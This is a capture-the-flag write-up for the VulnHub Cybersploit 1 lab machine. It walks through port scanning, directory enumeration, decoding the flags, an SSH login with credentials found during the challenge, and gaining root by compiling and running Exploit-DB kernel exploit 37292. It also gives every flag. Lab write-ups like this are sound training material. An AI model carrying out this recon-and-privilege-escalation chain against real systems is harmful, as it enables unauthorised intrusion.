Cybersploit-1-CTF
Writeup for the Cybersploit 1 CTF
Downloadlink : https://download.vulnhub.com/cybersploit/cybersploit.ova

3 Flags in total & gain root access

Recon -> Enumerate -> Weaponize -> Exploit
Locate vulnerable machine IP address by using netdiscover Ip : 192.168.23.133 (^ip address will be diffrent on your machine)
Scan for open ports using NMAP. nmap -sV -p- -v 192.168.23.133
-nmap results-

22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)

80/tcp open http Apache httpd 2.2.22 ((Ubuntu))

use DIRB tool to explore http port. : dirb http: //192.168.23.133
-dirb results-

---- Scanning URL: http: //192.168.23.133/ ----

http: //192.168.23.133/cgi-bin/ (CODE:403|SIZE:290)
http: //192.168.23.133/hacker (CODE:200|SIZE:3757743)
http: //192.168.23.133/index (CODE:200|SIZE:2333)
http: //192.168.23.133/index.html (CODE:200|SIZE:2333)
http: //192.168.23.133/robots (CODE:200|SIZE:79)
http: //192.168.23.133/robots.txt (CODE:200|SIZE:79)
http: //192.168.23.133/server-status (CODE:403|SIZE:295)
Explore the robot.txt link and the following encrypted message will appear:
R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9

use a base64 decoder and the first flag will be uncovered.
🏴‍☠️ Flag1: cybersploit{youtube.com/c/cybersploit}

Access the http: //192.168.23.133/index.html link and inspect the source code. A username called itsskv will be shown.

Use SSH to gain access ssh itsskv@@192.168.23.133 ,password = cybersploit{youtube.com/c/cybersploit

Once gaining access to the machine , ls and cat the flag2.txt. A binary code will be shown. Use a binary decoder to get the 2nd flag.

🏴‍☠️ flag2: cybersploit{https:t.me/cybersploit1}

Use the uname -a* command to find out information about the system.
Linux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux

cat etc/issue to find operation system info
Ubuntu 12.04.5 LTS \n \l

Search online for the Ubuntu 12.04.5 exploit
exploit db 🔗https://www.exploit-db.com/exploits/37292

Use SCP to transfer the exploit from attacking machine to the vulnerable machine by
scp 37292.c itsskv@192.168.23.133:/home/itsskv/

copy the file to the tmp folder cp 37292.c /tmp/

Complile the exploit gcc 37292.c

Excute the malicous code ./a.out

Use the command id and whoami to check if there is root access

cat /root/finalflag.txt to gain access to the final flag

🏴‍☠️ Flag3: cybersploit{Z3X21CW42C4 many many congratulations !}

End
